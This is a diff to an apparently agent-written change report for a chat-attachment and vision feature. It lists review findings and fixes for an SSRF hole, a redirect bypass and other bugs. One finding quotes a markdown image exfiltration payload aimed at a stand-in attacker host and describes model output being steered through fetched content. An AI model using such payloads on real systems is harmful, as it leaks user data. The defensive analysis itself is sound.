@@ -174,7 +174,12 @@ Added to `services/orion-hub/.env_example`:
 
 Added to `services/orion-llm-gateway/.env_example`:
 `LLM_GATEWAY_VISION_ENABLED`, `_VISION_PROPS_CACHE_TTL_SEC`, `_VISION_PROPS_TIMEOUT_SEC`,
-`LLM_GATEWAY_ATTACHMENT_ALLOWED_HOSTS`, `_ATTACHMENT_MAX_BYTES`, `_ATTACHMENT_FETCH_TIMEOUT_SEC`
+`LLM_GATEWAY_ATTACHMENT_BASE_URL`, `LLM_GATEWAY_ATTACHMENT_ALLOWED_HOSTS`,
+`_ATTACHMENT_MAX_BYTES`, `_ATTACHMENT_FETCH_TIMEOUT_SEC`
+
+`LLM_GATEWAY_ATTACHMENT_BASE_URL` is the security-relevant one: it is the *only*
+thing that decides where the gateway fetches attachment bytes from. The ref's own
+`source_url` is ignored. Empty means refuse to fetch at all.
 
 Removed: none. Renamed: none.
 
@@ -197,13 +202,13 @@ skipped keys requiring operator action: none.
 
 ```text
 services/orion-hub:      pytest tests/test_chat_attachments.py -q            -> 22 passed
-services/orion-hub:      pytest tests/test_chat_attachment_wiring.py -q      ->  8 passed
+services/orion-hub:      pytest tests/test_chat_attachment_wiring.py -q      ->  9 passed
 services/orion-hub:      pytest tests/test_chat_attachments_http.py -q       ->  5 passed
-services/orion-llm-gateway: pytest tests/test_vision_attachments.py -q       -> 24 passed
-services/orion-llm-gateway: pytest tests/test_vision_gate_integration.py -q  ->  8 passed
-services/orion-llm-gateway: pytest tests -q                                  -> 154 passed
+services/orion-llm-gateway: pytest tests/test_vision_attachments.py -q       -> 50 passed
+services/orion-llm-gateway: pytest tests/test_vision_gate_integration.py -q  ->  9 passed
+services/orion-llm-gateway: pytest tests -q                                  -> 183 passed
 repo root:               pytest tests/test_attachment_contract_end_to_end.py -q -> 6 passed
-services/orion-hub:      node --test static/js/                              -> 56 passed
+services/orion-hub:      node --test static/js/                              -> 61 passed
 ```
 
 Full Hub suite, compared against a detached worktree at this branch's true base
@@ -211,9 +216,11 @@ commit (`171394717`) with identical env:
 
 ```text
 true base (171394717): 35 failed
-this branch:           33 failed
+this branch:           34 failed
 NEW failures on branch: (none)
 ```
+
+Re-run after the review fixes landed; still zero new failures.
 
 **Zero regressions.** All 33 are pre-existing. An earlier comparison against the
 primary checkout was invalid and discarded — concurrent agents had merged 7 commits,
@@ -252,6 +259,91 @@ the primary checkout. That compose file is **unchanged** by this patch (only its
 Not run: an actual container build or bring-up. See "Restart required".
 
 ## Review findings fixed
+
+### Code review (subagent, effort=high) — 7 findings, all fixed
+
+- Finding: **CRITICAL — `requests` was undeclared; the gateway would not have
+  booted.** `app/vision.py` imported it at module level, `llm_backend.py` imports
+  `app.vision` at module level, and `main.py` imports that at startup. It is not
+  in `services/orion-llm-gateway/requirements.txt` and nothing pulls it in
+  transitively, so the first `docker compose up` after merge would have died with
+  `ModuleNotFoundError` — the entire LLM gateway down, not just vision. The tests
+  passed only because the dev venv happens to have `requests`. Same shape as the
+  sql-writer incident earlier the same day.
+  - Fix: switched to `httpx`, which is already declared and already used
+    throughout this service — reuse rather than a new dependency.
+  - Evidence: AST-walked `vision.py`'s imports against `requirements.txt`; the
+    only third-party import is now `httpx`, and it is declared. 183 gateway tests
+    pass.
+- Finding: **SSRF — the allowlist did not contain what it appeared to.** It
+  matched `hostname` only, leaving port and path unconstrained, and the shipped
+  value is the Tailscale node IP that also fronts the bus, Postgres, the Hub, and
+  every other Orion service. `source_url` is fully client-controlled: the browser
+  round-trips the ref and `_attachments_from_payload` only validates its *shape*,
+  never re-derives the URL. A crafted turn could have made the gateway GET an
+  internal endpoint and base64 the response straight into the model prompt. The
+  `bytes: 0` case (a legal value) additionally skipped the only size cross-check.
+  - Fix: **the gateway no longer uses `source_url` at all.** It rebuilds the URL
+    as `<LLM_GATEWAY_ATTACHMENT_BASE_URL>/<sha256>` with the sha regex-validated,
+    so the only caller-supplied component is 64 hex characters — no path or
+    authority to inject into. Added the strongest possible content check on top:
+    the fetched bytes must **hash to the requested sha256**, which is free
+    because the store is content-addressed and holds even if the transport were
+    diverted. Fetched bytes must also sniff as the declared mime, since the
+    declared value is what reaches the model. `bytes` is now `ge=1`.
+  - Evidence: `test_a_hostile_source_url_cannot_influence_the_fetch` parametrises
+    five hostile URLs (including the exact internal-service example) and asserts
+    the derived URL is unchanged; `test_a_non_hex_sha_is_refused` covers traversal
+    and encoded-traversal shas; `test_fetch_refuses_content_that_does_not_match_the_address`.
+- Finding: **the allowlist was bypassable by redirect** — `requests.get` follows
+  redirects by default, and only the pre-redirect URL was checked.
+  - Fix: `httpx` does not follow redirects by default; `follow_redirects=False`
+    is now explicit.
+  - Evidence: `test_fetch_does_not_follow_redirects` asserts the client kwarg.
+- Finding: **drag-and-drop attach was broken in a real browser.** The
+  `dragover` handler gated `preventDefault()` on `imageFilesFrom()`, but
+  `DataTransfer` is in *protected mode* mid-drag — `getAsFile()` returns null and
+  `.files` is empty — so it always returned `[]`, `preventDefault()` never fired,
+  and the browser's default action took over: navigating away to the dropped
+  image and discarding the composer contents.
+  - Fix: new `dragCarriesImage()` reads only `kind`/`type`, which protected mode
+    does expose.
+  - Evidence: `test_dragCarriesImage_reads_kind_type...` asserts the
+    protected-mode shape explicitly *and* asserts `imageFilesFrom` returns 0 for
+    it, pinning why the old gate was wrong. jsdom could not have caught this
+    against the previous synthetic fixture.
+- Finding: **`HUB_CHAT_ATTACHMENT_MAX_PER_TURN=0` silently dropped every
+  attachment**, with the warning also suppressed. The turn then reached the
+  gateway looking attachment-free, so the "refuse loudly" path never fired and
+  Orion would answer text-only after Juniper attached an image — the exact silent
+  failure this feature exists to prevent, reachable by an operator setting `0` to
+  mean "unlimited".
+  - Fix: `0` (and any unparseable value) now means unlimited.
+  - Evidence: `test_zero_cap_means_unlimited_not_silent_drop`,
+    `test_unparseable_cap_falls_back_to_unlimited`.
+- Finding: **`img`/`src` in the sanitizer allowlist was an outbound channel.** A
+  reply containing `![](https://attacker/?d=…)` issues that request on render,
+  with no click — and this module's own premise is that model output is
+  influenceable through recall and fetched web content.
+  - Fix: remote images are replaced with an inert placeholder; only the Hub's own
+    `/api/chat/attachments/` path renders.
+  - Evidence: three tests covering a remote URL, a protocol-relative URL, and the
+    same path on a foreign origin — plus one asserting own-attachments still render.
+- Finding: **the vision diagnostic never reached the Hub on the refusal and
+  fetch-failure paths.** `handle_chat` forwards `result["raw"]` plus an explicit
+  key list; `"vision"` is not on it, and both early returns carried `"raw": {}`
+  with the diagnostic only at top level — dropped on exactly the paths where it
+  matters most.
+  - Fix: `vision_diag` is now inside `raw` on all three early returns.
+  - Evidence: `test_refusal_diagnostic_reaches_the_hub_via_raw`.
+- Finding: streamed responses were never closed, leaking a pooled connection on
+  every failure path.
+  - Fix: the stream is context-managed.
+
+Two review notes needed no action: `mmproj_filename` does have a real consumer
+(`services/orion-llamacpp-host/app/main.py:293,389`), so the profile change is
+load-bearing; and `scripts/chat_request_builder.py` is a pre-existing dead module
+with no importers.
 
 ### Self-review (found while the review subagent was still running)
 
